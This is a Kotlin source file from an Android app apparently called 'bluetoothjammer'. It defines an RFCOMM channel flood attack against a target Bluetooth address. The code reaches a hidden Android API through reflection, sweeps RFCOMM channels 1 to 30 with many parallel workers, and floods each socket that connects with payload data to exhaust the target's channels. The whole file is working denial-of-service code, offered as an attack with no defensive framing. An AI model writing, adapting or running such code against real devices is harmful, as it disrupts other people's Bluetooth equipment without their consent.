package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import androidx.core.content.ContextCompat.getSystemService
import com.eikarna.bluetoothjammer.R
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.Collections

/**
 * RFCOMM Channel Flood: sweeps RFCOMM channels 1-30 using the hidden
 * BluetoothDevice.createInsecureRfcommSocket(int) method accessed via
 * reflection (the classic SPP channel trick), exhausting channels and
 * flooding the sockets that connect.
 *
 * Caveat: Android's hidden-API enforcement (API 28+) may block the reflective
 * call on some devices/firmwares; the attack logs the failure and stops.
 */
class RfcommChannelFloodAttack(
    private val targetAddress: String,
    private val threads: Int = 8,
    private val rateDelayMs: Int = 0,
    private val payloadPattern: PayloadPattern = PayloadPattern.FIXED,
    private val payloadSize: Int = 0
) : BluetoothAttack {

    private var appContext: Context? = null
    override val displayName: String
        get() = appContext?.getString(AttackType.RFCOMM_CHANNEL_FLOOD.labelRes) ?: AttackType.RFCOMM_CHANNEL_FLOOD.fallbackLabel
    override val description: String
        get() = appContext?.getString(AttackType.RFCOMM_CHANNEL_FLOOD.descRes) ?: AttackType.RFCOMM_CHANNEL_FLOOD.fallbackDesc

    private val sockets = Collections.synchronizedList(mutableListOf<BluetoothSocket>())
    private var scope: CoroutineScope? = null
    @Volatile
    private var running = false

    override fun isRunning() = running

    private val hiddenConnectMethod by lazy {
        runCatching {
            BluetoothDevice::class.java.getMethod("createInsecureRfcommSocket", Int::class.javaPrimitiveType)
        }.getOrNull()
    }

    @SuppressLint("MissingPermission")
    override fun start(context: Context, onLog: (String) -> Unit) {
        if (running) return
        running = true
        appContext = context.applicationContext
        val adapter = getSystemService(context, BluetoothManager::class.java)?.adapter
        if (adapter == null) {
            running = false
            return
        }
        val device = try {
            adapter.getRemoteDevice(targetAddress)
        } catch (e: IllegalArgumentException) {
            running = false
            return
        }
        val method = hiddenConnectMethod
        if (method == null) {
            onLog("[RFCOMM] " + context.getString(R.string.log_rfcomm_hidden_api))
            running = false
            return
        }

        val workers = threads.coerceIn(1, 30)
        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        onLog("[RFCOMM] " + context.getString(R.string.log_rfcomm_sweep, targetAddress, workers))
        repeat(workers) { worker ->
            scope!!.launch {
                var probe = 0
                while (isActive && running) {
                    val channel = probe % 30 + 1
                    probe++
                    var socket: BluetoothSocket? = null
                    try {
                        socket = method.invoke(device, channel) as? BluetoothSocket
                        socket?.connect()
                        if (socket?.isConnected == true) {
                            sockets.add(socket)
                            onLog("[$worker][CONN] " + context.getString(R.string.log_rfcomm_channel_connected, channel))
                            FloodSupport.flood(
                                context, socket, payloadPattern, payloadSize, rateDelayMs,
                                { running }, onLog, "$worker:C$channel"
                            )
                            sockets.remove(socket)
                        } else {
                            onLog("[$worker][RETRY] " + context.getString(R.string.log_rfcomm_channel_rejected, channel))
                        }
                    } catch (e: Exception) {
                        runCatching { socket?.close() }
                        if (isActive && running) onLog("[$worker][RETRY] " + context.getString(R.string.log_rfcomm_channel_failed, channel))
                    }
                    jitterDelay(maxOf(100, rateDelayMs))
                }
            }
        }
    }

    override fun stop() {
        running = false
        scope?.cancel()
        scope = null
        synchronized(sockets) {
            sockets.forEach { s -> runCatching { s.close() } }
            sockets.clear()
        }
    }
}
